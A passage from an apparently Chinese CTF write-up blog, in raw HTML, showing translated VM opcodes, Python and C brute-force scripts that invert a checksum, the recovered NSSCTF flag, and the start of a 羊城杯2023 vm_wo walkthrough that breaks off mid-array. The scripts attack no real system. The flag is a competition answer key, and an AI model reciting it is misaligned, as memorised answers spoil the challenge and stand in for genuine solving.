class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">cmp 3474130140, reg1</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[40]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[41]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[42]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[43]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">reg9=reg1</span><br><span class="line">r3 = 32</span><br><span class="line">reg1*=reg3</span><br><span class="line">reg4=reg1</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 17</span><br><span class="line">reg1&gt;&gt;=reg2</span><br><span class="line">reg5=reg1</span><br><span class="line">reg1=reg5</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg2= 13</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg1^=reg9</span><br><span class="line">reg1^=reg4</span><br><span class="line">reg1^=reg5</span><br><span class="line">cmp 674991748, reg1</span><br><span class="line">jne exit</span><br></pre></td></tr></table></figure><p>前面异或直接给ai破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">fog = [<span class="number">0x0000007B</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000037</span>, <span class="number">0x000000E8</span>]</span><br><span class="line">s = [<span class="literal">None</span>] * <span class="number">32</span>  <span class="comment"># 创建一个长度为 32 的列表来存储 s 的值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于每个 i，x 和 y 的值</span></span><br><span class="line"><span class="keyword">for</span> i, x, y <span class="keyword">in</span> [</span><br><span class="line">    (<span class="number">0</span>, fog[<span class="number">0</span>], <span class="number">74</span>), </span><br><span class="line">    (<span class="number">1</span>, fog[<span class="number">1</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">2</span>, fog[<span class="number">3</span>], <span class="number">221</span>), </span><br><span class="line">    (<span class="number">3</span>, fog[<span class="number">2</span>], <span class="number">15</span>), </span><br><span class="line">    (<span class="number">4</span>, fog[<span class="number">1</span>], <span class="number">27</span>), </span><br><span class="line">    (<span class="number">5</span>, fog[<span class="number">3</span>], <span class="number">137</span>), </span><br><span class="line">    (<span class="number">6</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">7</span>, fog[<span class="number">2</span>], <span class="number">84</span>), </span><br><span class="line">    (<span class="number">8</span>, fog[<span class="number">0</span>], <span class="number">79</span>), </span><br><span class="line">    (<span class="number">9</span>, fog[<span class="number">0</span>], <span class="number">78</span>), </span><br><span class="line">    (<span class="number">10</span>, fog[<span class="number">2</span>], <span class="number">85</span>), </span><br><span class="line">    (<span class="number">11</span>, fog[<span class="number">2</span>], <span class="number">86</span>), </span><br><span class="line">    (<span class="number">12</span>, fog[<span class="number">3</span>], <span class="number">142</span>), </span><br><span class="line">    (<span class="number">13</span>, fog[<span class="number">1</span>], <span class="number">73</span>), </span><br><span class="line">    (<span class="number">14</span>, fog[<span class="number">2</span>], <span class="number">14</span>), </span><br><span class="line">    (<span class="number">15</span>, fog[<span class="number">0</span>], <span class="number">75</span>), </span><br><span class="line">    (<span class="number">16</span>, fog[<span class="number">2</span>], <span class="number">6</span>), </span><br><span class="line">    (<span class="number">17</span>, fog[<span class="number">2</span>], <span class="number">84</span>), </span><br><span class="line">    (<span class="number">18</span>, fog[<span class="number">1</span>], <span class="number">26</span>), </span><br><span class="line">    (<span class="number">19</span>, fog[<span class="number">0</span>], <span class="number">66</span>), </span><br><span class="line">    (<span class="number">20</span>, fog[<span class="number">2</span>], <span class="number">83</span>), </span><br><span class="line">    (<span class="number">21</span>, fog[<span class="number">0</span>], <span class="number">31</span>), </span><br><span class="line">    (<span class="number">22</span>, fog[<span class="number">2</span>], <span class="number">82</span>), </span><br><span class="line">    (<span class="number">23</span>, fog[<span class="number">3</span>], <span class="number">219</span>), </span><br><span class="line">    (<span class="number">24</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">25</span>, fog[<span class="number">3</span>], <span class="number">217</span>), </span><br><span class="line">    (<span class="number">26</span>, fog[<span class="number">0</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">27</span>, fog[<span class="number">2</span>], <span class="number">85</span>), </span><br><span class="line">    (<span class="number">28</span>, fog[<span class="number">1</span>], <span class="number">25</span>), </span><br><span class="line">    (<span class="number">29</span>, fog[<span class="number">2</span>], <span class="number">0</span>), </span><br><span class="line">    (<span class="number">30</span>, fog[<span class="number">0</span>], <span class="number">75</span>), </span><br><span class="line">    (<span class="number">31</span>, fog[<span class="number">1</span>], <span class="number">30</span>)</span><br><span class="line">]:  </span><br><span class="line"></span><br><span class="line">    s[i] = <span class="built_in">chr</span>(y ^ x)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#16584abc45baff901c59dde3b1bb6701</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">characters = string.ascii_letters + string.digits + string.punctuation + <span class="string">&#x27; &#x27;</span></span><br><span class="line">combinations = itertools.product(characters, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">对每个组合执行给定的操作</span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> combinations:</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span>.join(combination)</span><br><span class="line">    reg = [<span class="number">0</span>] * <span class="number">10</span>  </span><br><span class="line">    reg[<span class="number">9</span>] = <span class="built_in">int</span>.from_bytes(s.encode(), <span class="string">&#x27;big&#x27;</span>)  </span><br><span class="line">    <span class="comment"># 将字符串转换为整数,这里用big，存储就是正序，不然是小端序转换</span></span><br><span class="line"></span><br><span class="line">    reg[<span class="number">1</span>] = reg[<span class="number">9</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">5</span></span><br><span class="line">    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">7</span></span><br><span class="line">    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">2565961507</span></span><br><span class="line">    reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">24</span></span><br><span class="line">    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">904182048</span></span><br><span class="line">    reg[<span class="number">1</span>] &amp;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    reg[<span class="number">9</span>] = reg[<span class="number">1</span>]</span><br><span class="line">    reg[<span class="number">2</span>] = <span class="number">18</span></span><br><span class="line">    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>]</span><br><span class="line">    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查结果是否等于 1877735783</span></span><br><span class="line">    <span class="keyword">if</span> reg[<span class="number">1</span>] == <span class="number">1877735783</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到了满足条件的字符串：<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># a245</span></span><br></pre></td></tr></table></figure><p>第二部分有与，不可能逆出来，干脆爆破</p><p>后面两次有左移，不好用python，就用c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 所有可能的字符</span></span><br><span class="line"><span class="type">char</span> characters[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化寄存器</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> reg[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对每一个组合进行检查</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(characters); i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(characters); j++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(characters); k++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; <span class="built_in">strlen</span>(characters); l++) &#123;</span><br><span class="line"><span class="type">char</span> s[<span class="number">40</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">s[<span class="number">36</span>] = characters[i];</span><br><span class="line">s[<span class="number">37</span>] = characters[j];</span><br><span class="line">s[<span class="number">38</span>] = characters[k];</span><br><span class="line">s[<span class="number">39</span>] = characters[l];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行给定的操作</span></span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">36</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">37</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">38</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">8</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = s[<span class="number">39</span>];</span><br><span class="line">reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查结果</span></span><br><span class="line"><span class="keyword">if</span> (reg[<span class="number">1</span>] == <span class="number">3474130140</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Found matching combination: %c%c%c%c\n&quot;</span>, s[<span class="number">36</span>], s[<span class="number">37</span>], s[<span class="number">38</span>], s[<span class="number">39</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No matching combination found.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//b06c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 所有可能的字符</span></span><br><span class="line">    <span class="type">char</span> characters[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化寄存器</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> reg[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对每一个组合进行检查</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(characters); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(characters); j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="built_in">strlen</span>(characters); k++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; <span class="built_in">strlen</span>(characters); l++) &#123;</span><br><span class="line">                    <span class="type">char</span> s[<span class="number">44</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                    s[<span class="number">40</span>] = characters[i];</span><br><span class="line">                    s[<span class="number">41</span>] = characters[j];</span><br><span class="line">                    s[<span class="number">42</span>] = characters[k];</span><br><span class="line">                    s[<span class="number">43</span>] = characters[l];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 执行给定的操作</span></span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">40</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">41</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">42</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">8</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = s[<span class="number">43</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] += reg[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">                    reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">9</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">3</span>] = <span class="number">32</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] *= reg[<span class="number">3</span>];</span><br><span class="line">                    reg[<span class="number">4</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">17</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &gt;&gt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">5</span>] = reg[<span class="number">1</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] = reg[<span class="number">5</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">2</span>] = <span class="number">13</span>;</span><br><span class="line">                    reg[<span class="number">1</span>] &lt;&lt;= reg[<span class="number">2</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">9</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">4</span>];</span><br><span class="line">                    reg[<span class="number">1</span>] ^= reg[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 检查结果</span></span><br><span class="line">                    <span class="keyword">if</span> (reg[<span class="number">1</span>] == <span class="number">674991748</span>) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Found matching combination: %c%c%c%c\n&quot;</span>, s[<span class="number">40</span>], s[<span class="number">41</span>], s[<span class="number">42</span>], s[<span class="number">43</span>]);</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No matching combination found.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dc23</span></span><br></pre></td></tr></table></figure><p>最后合并一下flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;<span class="number">16584</span>abc45baff901c59dde3b1bb6701a254b06cdc23&#125;</span><br></pre></td></tr></table></figure><p>这个题最后很明显是不能直接逆向的，那就需要爆破，所以翻译opcode的时候写成python语法或者c语法就会更方便，然后注意一下爆破的时候的大端序和小端序就好了</p><h2 id="羊城杯2023-vm-wo"><a href="#羊城杯2023-vm-wo" class="headerlink" title="羊城杯2023 vm_wo"></a>羊城杯2023 vm_wo</h2><p>这道题是我第一次遇见mac的题</p><p>一开始用ida 8.3打开，但是不能反编译，去网上看wp发现好像都能反编译，于是试了试7.7结果就可以了&gt;_&lt;</p><p>打开之后直接去主函数，直接拿到了last</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xDF</span>, <span class="number">0xD5</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>, <span class="number">0xFF</span>, <span class="number">0xDB</span>, <span class="number">0xA1</span>, <span class="number">0xA5</span>, <span class="number">0x89</span>, <span class="number">0xBD</span>, <span class="number">0xE9</span>, <span class="number">0x95</span>, <span class="number">0xB3</span>, <span class="number">0x9D</span>, <span 